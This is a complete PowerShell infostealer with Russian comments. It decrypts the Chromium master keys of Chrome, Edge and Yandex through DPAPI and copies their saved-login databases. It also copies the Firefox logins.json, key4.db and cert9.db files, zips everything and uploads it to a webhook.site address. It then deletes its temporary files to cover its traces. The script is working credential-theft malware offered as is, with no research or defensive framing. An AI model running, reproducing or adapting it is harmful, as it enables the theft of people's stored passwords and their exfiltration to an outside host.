# [ Конфигурация ]
$webhookUrl = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
$tempDir = "$env:TEMP\sys_info_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

# Подгружаем сборку для работы с DPAPI (нужно для Chromium)
Add-Type -AssemblyName System.Security

# Функция для дешифровки ключа Chromium-браузеров
function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
            
            # Дешифровка мастер-ключа через системный DPAPI
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            
            $base64Key = [Convert]::ToBase64String($masterKey)
            $logLine = "[$($label)] Master Key: $($base64Key)"
            Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
            return $true
        } catch { 
            $errMsg = $_.Exception.Message
            $errLine = "[$($label)] Key Error: $($errMsg)"
            Out-File -FilePath $logPath -InputObject $errLine -Append -Encoding UTF8
            return $false 
        }
    }
    return $false
}

# 1. СБОР ДАННЫХ CHROMIUM (Chrome, Edge, Yandex)
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userDataPath) {
        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($file in $foundFiles) {
            $profileName = $file.Directory.Name
            $localState = Join-Path $userDataPath "Local State"
            
            $label = "$($b.name)_$($profileName)"
            if (Get-Key $localState $label) {
                Copy-Item $file.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. СБОР ДАННЫХ FIREFOX
# --- ОБНОВЛЕННЫЙ БЛОК ДЛЯ FIREFOX ---
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    $ffProfiles = Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $ffProfiles) {
        $label = "Firefox_$($profile.Name)"
        $loginsJson = Join-Path $profile.FullName "logins.json"
        $keyDb = Join-Path $profile.FullName "key4.db"
        $certDb = Join-Path $profile.FullName "cert9.db" # Добавили путь к базе сертификатов
        
        if (Test-Path $loginsJson) {
            Copy-Item $loginsJson -Destination "$tempDir\$($label)_logins.json" -Force -ErrorAction SilentlyContinue
            if (Test-Path $keyDb) {
                Copy-Item $keyDb -Destination "$tempDir\$($label)_key4.db" -Force -ErrorAction SilentlyContinue
            }
            # Копируем cert9.db, если он существует
            if (Test-Path $certDb) {
                Copy-Item $certDb -Destination "$tempDir\$($label)_cert9.db" -Force -ErrorAction SilentlyContinue
            }
            $logLine = "[$($label)] Found Firefox profile. All necessary files copied."
            Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
        }
    }
}

# 3. УПАКОВКА И ОТПРАВКА
if ((Get-ChildItem $tempDir).Count -gt 1) {
    $zipPath = "$env:TEMP\data_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
    
    try {
        $wc = New-Object System.Net.WebClient
        $wc.UploadFile($webhookUrl, "POST", $zipPath) | Out-Null
    } catch {}
    
    # Очистка следов
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}

Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
